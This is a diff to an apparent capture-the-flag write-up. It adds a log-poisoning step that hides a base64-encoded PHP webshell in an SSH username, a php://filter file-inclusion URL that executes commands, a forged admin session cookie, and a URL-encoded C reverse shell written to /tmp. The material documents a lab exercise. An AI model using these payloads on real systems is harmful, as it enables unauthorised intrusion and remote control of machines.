@@ -86,9 +86,18 @@ pub fn verify(expected: &[u8], received: &[u8]) -> bool {
 - Execute commands and validate that the input is welled printed into the ad hoc section
 
 ````bash
-http://ip/HiddenAdministrativeControlPanel.php?load=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Duserloginfail.txt&cmd=id
+ssh V0VCU0hFTExPSyA8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=@localhost
+#and then curl
+#http://ip/HiddenAdministrativeControlPanel.php?load=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Duserloginfail.txt&cmd=id
 ````
 <p align="center">
 <img src="Screenshots/S10.png" style="width: 50%">
 </p>
     
+<h2> Step 3: Launch a revshell to get a stable prompt and perform a privesc to read the flag </h2>
+
+<p align="justify"> Once the webshell was deployed and commands could have been ran on the machine, the final step was to laucnh a revshell to get a stable prompt to finally escalate privileges an read the flag. To do so, the solution was to user libc because netcat was missing and it was a docker so no /dev/tcp folder too. To get a revshell </p>
+
+````bash
+curl -b "session_token=eyd1c2VybmFtZSc6J2d1ZXN0JywgJ3JvbGUnOidhZG1pbid9./3b1GSdZghQ6flLq0yEjz5fDtnXbRcBItrm20FCyAoI=" http://localhost/HiddenAdministrativeControlPanel.php?load=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Duserloginfail.txt&cmd=echo%20%27%23include%20%3Cstdio.h%3E%0A%23include%20%3Csys%2Fsocket.h%3E%0A%23include%20%3Cnetinet%2Fin.h%3E%0A%23include%20%3Carpa%2Finet.h%3E%0A%23include%20%3Cstring.h%3E%0A%23include%20%3Cunistd.h%3E%0A%0A%23define%20IP%20%22127.0.0.1%22%0A%23define%20PORT%2014456%0A%0Aint%20main%28%29%0A%7B%0A%20%20%20%20int%20sockfd%20%3D%20socket%28AF_INET%2C%20SOCK_STREAM%2C%200%29%3B%0A%0A%20%20%20%20struct%20sockaddr_in%20server_addr%3B%0A%20%20%20%20server_addr.sin_family%20%3D%20AF_INET%3B%0A%20%20%20%20server_addr.sin_port%20%3D%20htons%28PORT%29%3B%0A%0A%20%20%20%20inet_pton%28AF_INET%2C%20IP%2C%20%26%28server_addr.sin_addr%29%29%3B%0A%0A%20%20%20%20connect%28sockfd%2C%20%28struct%20sockaddr%20%2A%29%26server_addr%2C%20sizeof%28server_addr%29%29%3B%0A%0A%20%20%20%20dup2%28sockfd%2C%200%29%3B%0A%20%20%20%20dup2%28sockfd%2C%201%29%3B%0A%20%20%20%20dup2%28sockfd%2C%202%29%3B%0A%0A%20%20%20%20execve%28%22%2Fbin%2Fsh%22%2C%200%2C%200%29%3B%0A%0A%20%20%20%20close%28sockfd%29%3B%0A%0A%20%20%20%20return%200%3B%0A%7D%27%20%3E%20%2Ftmp%2Frev2.c%09
+````
